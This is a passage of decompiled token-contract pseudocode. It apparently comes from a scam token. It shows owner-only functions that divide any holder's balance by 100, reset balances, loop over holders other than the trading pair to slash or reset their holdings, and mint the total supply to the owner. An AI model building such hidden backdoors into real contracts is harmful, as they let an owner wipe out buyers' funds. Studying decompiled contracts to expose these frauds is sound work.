...
function sub_fa69de09(?) {
    ...
    balanceOf[address(arg1)].field_0 = balanceOf[address(arg1)].field_2
}

function sub_ce4e07ff(?) {
    require calldata.size - 4 >= 32
    require msg.sender == stor5
    balanceOf[address(arg1)].field_0 = balanceOf[address(arg1)].field_0 / 100
}

function mint() {
    require msg.sender == stor5
    balanceOf[msg.sender].field_0 += totalSupply
    if not totalSupply:
        totalSupply = 0
    else:
...
function sub_4cc025f1(?) {
    ...
    while idx < sub_96194a55.length:
        ...
        if address(sub_96194a55[idx]) != pairAddress:
            ...
            mem[32] = 4
            balanceOf[address(stor7[idx])].field_0 = balanceOf[address(stor7[idx])].field_2
        idx = idx + 1
        continue 
...
function sub_ae4ca6f1(?) {
    ...
    while idx < sub_96194a55.length:
        ...
        if address(sub_96194a55[idx]) != pairAddress:
            ...
            mem[0] = address(sub_96194a55[idx])
            mem[32] = 4
            balanceOf[address(stor7[idx])].field_0 = balanceOf[address(stor7[idx])].field_0 / 100
        idx = idx + 1
        continue 
    sub_96194a55.length = 0
    idx = 0
...
function transferFrom(address arg1, address arg2, uint256 arg3) {
    ...
    if arg3 + balanceOf[arg2].field_0 < balanceOf[arg2].field_0:
        revert with 0, 'SafeMath: addition overflow'
